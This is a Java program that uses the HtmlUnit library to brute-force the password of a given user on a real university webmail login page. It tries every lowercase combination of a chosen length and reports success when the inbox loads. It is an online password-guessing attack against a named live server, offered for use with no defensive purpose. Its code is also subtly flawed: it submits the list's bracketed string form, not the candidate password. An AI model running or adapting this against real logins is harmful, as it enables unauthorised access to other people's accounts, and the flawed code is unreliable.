import com.gargoylesoftware.htmlunit.*;
import com.gargoylesoftware.htmlunit.html.*;

import java.util.ArrayList;
import java.util.Scanner;

public class Main  {

    static int counter = 0;
    static ArrayList<Character> pass = new ArrayList<>();
    public static void main(String[] args) throws Exception {

        WebClient webClient = new WebClient();
        HtmlPage page1 = webClient.getPage("https://mail.ce.sharif.edu");

        HtmlForm form = page1.getFormByName("form");

        HtmlSubmitInput button = form.getInputByValue("Login");
        HtmlTextInput htmlTextInput = form.getInputByName("_user");
        Scanner scanner = new Scanner(System.in);
        System.out.println("Please Enter The ID :");
        String id = scanner.next();
        HtmlPasswordInput textField = form.getInputByName("_pass");

        System.out.println("Please Enter The Length Of Password :");
        int n = scanner.nextInt();

        getPasswd(webClient, id, page1, button, htmlTextInput, textField, n);


    }

    private static void getPasswd(WebClient webClient, String id, HtmlPage page1, HtmlSubmitInput button, HtmlTextInput htmlTextInput, HtmlPasswordInput textField, int n) throws Exception{
        if (counter > (n-1)){
            return;
        }
        counter++;
        pass.add((char)96);
        int head = pass.size();
        for (int i = 0; i < 26; i++){
            pass.set(head - 1, (char)(pass.get(head - 1)+1));
            if (pass.size() == n){
                webClient = new WebClient();
                page1 = webClient.getPage("https://mail.ce.sharif.edu");
                HtmlForm form = page1.getFormByName("form");

                button = form.getInputByValue("Login");
                htmlTextInput = form.getInputByName("_user");
                htmlTextInput.setValueAttribute(id);
                textField = form.getInputByName("_pass");
                textField.setValueAttribute(pass.toString());
                HtmlPage page2 = button.click();
                if (page2.toString().contains("https://mail.ce.sharif.edu/?_task=mail&_mbox=INBOX")){
                    System.out.println("\nTried Password = "+pass.toString()+"  And Result = " + page2+" so it was successful :)\n");
                    System.out.println("\nPASSWORD FOUND !");
                    System.exit(1000);
                }
                else
                    System.out.println("\nTried Password = "+pass.toString()+"  And Result = " + page2+" so it was a failure :(\n");


            }
            getPasswd(webClient, id, page1, button, htmlTextInput, textField, n);
        }
        counter--;
        pass.remove(head - 1);
    }
}